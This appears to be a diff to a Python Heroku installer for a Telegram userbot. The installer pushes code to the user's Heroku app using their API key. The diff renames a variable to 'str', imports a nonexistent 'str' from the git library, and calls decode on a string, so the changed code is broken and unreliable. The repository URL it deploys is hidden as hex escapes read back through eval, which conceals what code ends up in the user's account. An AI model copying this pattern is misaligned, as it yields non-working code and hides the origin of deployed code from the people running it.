@@ -2,7 +2,7 @@ import heroku3
 from time import time
 import random
 import requests
-from git import Repo
+from git import str
 from asena_installer import *
 from .astring import main
 import os
@@ -33,17 +33,17 @@ def createApp (connect):
         exit(1)
     return appname
 
-def hgit (connect, repo, appname):
+def hgit (connect, str, appname):
     global api
     app = connect.apps()[appname]
     giturl = app.git_url.replace(
             "https://", "https://api:" + api + "@")
 
-    if "heroku" in repo.remotes:
-        remote = repo.remote("heroku")
+    if "heroku" in str.remotes:
+        remote = str.remote("heroku")
         remote.set_url(giturl)
     else:
-        remote = repo.create_remote("heroku", giturl)
+        remote = str.create_remote("heroku", giturl)
     try:
         remote.push(refspec="HEAD:refs/heads/master", force=True)
     except Exception as e:
@@ -101,9 +101,9 @@ if __name__ == "__main__":
     if os.path.isdir("./asenauserbot/"):
         rm_r("./asenauserbot/")
     yoxlama = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x62\x72\x65\x6E\x64\x73\x75\x70\x70\x6F\x72\x74\x2F\x62\x72\x65\x6E\x64\x75\x73\x65\x72\x62\x6F\x74"
-    repo = eval(b'yoxlama').decode("utf-8")
+    str = eval(b'yoxlama').decode("utf-8")
     onemli(LANG['DEPLOYING'])
-    app = hgit(heroku, repo, appname)
+    app = hgit(heroku, str, appname)
     config = app.config()
 
     onemli(LANG['WRITING_CONFIG'])
